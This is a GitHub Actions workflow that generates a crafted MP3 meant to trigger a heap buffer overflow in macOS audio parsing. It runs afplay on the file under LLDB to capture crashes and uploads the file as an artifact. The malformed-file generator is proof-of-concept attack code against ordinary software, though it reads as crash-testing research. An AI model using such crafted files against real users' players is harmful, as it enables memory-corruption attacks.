name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l

      # Updated: Patch encodeme.mm to attempt a heap buffer overflow.
      - name: Patch encodeme.mm to generate a heap-overflow MP3
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm to generate a file designed to cause a heap overflow..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #include <string.h>

          int main(int argc, const char * argv[]) {
              @autoreleasepool {
                  time_t startTime = time(NULL);
                  fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));

                  NSString *fileName = @"output_overflow.mp3";
                  FILE *file = fopen(fileName.UTF8String, "wb");
                  if (!file) {
                      fprintf(stderr, "Failed to create file: %s\n", fileName.UTF8String);
                      return 1;
                  }

                  // PoC: Heap Buffer Overflow Attempt
                  // This header lies, claiming the frame's data size is very small (1 byte).
                  // A vulnerable parser might allocate a small buffer based on this lie.
                  char malicious_header[4] = {
                      (char)0xFF, (char)0xFB, // MP3 sync and version/layer info
                      (char)0x50, // Bitrate 80kbps, Padding bit=0
                      (char)0x00
                  };
                  
                  // Frame size for 80kbps at 44.1kHz is 156 bytes. We will write much more.
                  fwrite(malicious_header, 1, sizeof(malicious_header), file);

                  // Now, write a large chunk of data immediately after the deceitful header.
                  // If the player allocated a small buffer, writing this large block
                  // will cause a heap buffer overflow.
                  char overflow_data[2048];
                  memset(overflow_data, 'A', sizeof(overflow_data));
                  fwrite(overflow_data, 1, sizeof(overflow_data), file);
                  
                  fprintf(stderr, "PoC: Wrote a file designed to trigger a heap overflow.\n");
                  fclose(file);

                  time_t endTime = time(NULL);
                  fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
              }
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile encodeme.mm with debug symbols
      - name: Compile encodeme.mm for Debugging
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme.mm with debug symbols (-g)..."
          clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_debug
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi

      # Run and Verify File Generation
      - name: Run and Verify File Generation
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          ./encodeme_debug
          echo "File 'output_overflow.mp3' generated."
          ls -l output_overflow.mp3
          
      # Launch the player directly under LLDB to catch any startup crashes
      - name: Launch Player Under LLDB to Catch Startup Crashes
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Audio Player (afplay) with heap overflow file ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor afplay..."
          cat > player_debug_script.lldb << 'EOF'
          # Run the process. LLDB will stop if a crash occurs.
          run
          # If the process crashed, get the backtrace. If it exited normally, this shows the state at exit.
          bt
          quit
          EOF

          echo "Launching afplay under LLDB to detect any startup crash..." >> $PLAYER_LOG_FILE
          # Execute afplay with the invalid file as an argument, under the control of the LLDB script.
          # We add '|| true' because afplay might exit with an error, which we expect.
          lldb -s player_debug_script.lldb -- afplay output_overflow.mp3 >> $PLAYER_LOG_FILE 2>&1 || true

          echo "✅ Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts: the invalid MP3 and the player debug log
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: audio-and-debug-artifacts
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/output_overflow.mp3
            AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
          retention-days: 7
          if-no-files-found: error
